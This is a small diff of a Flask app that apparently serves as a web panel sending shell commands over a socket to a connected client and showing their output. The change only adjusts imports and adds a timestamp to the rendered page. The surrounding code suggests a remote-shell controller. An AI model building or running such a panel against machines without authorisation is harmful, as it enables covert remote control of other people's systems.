@@ -1,10 +1,9 @@
+from types import new_class
 from flask import Flask, render_template, request
 
-import os
-import time
 import socket
 import logging
-import threading
+from datetime import datetime
 
 app = Flask(__name__)
 wsgi_app = app.wsgi_app
@@ -76,7 +75,7 @@ def index():
         if shell(command, client_socket) == True:
             out += getData(client_socket)
             out += "\n\n"
-    return render_template('index.html', out=out)
+    return render_template('index.html', out=out, now=datetime.utcnow())
 
 @app.route('/shutdown', methods=['POST'])
 def shutdown():
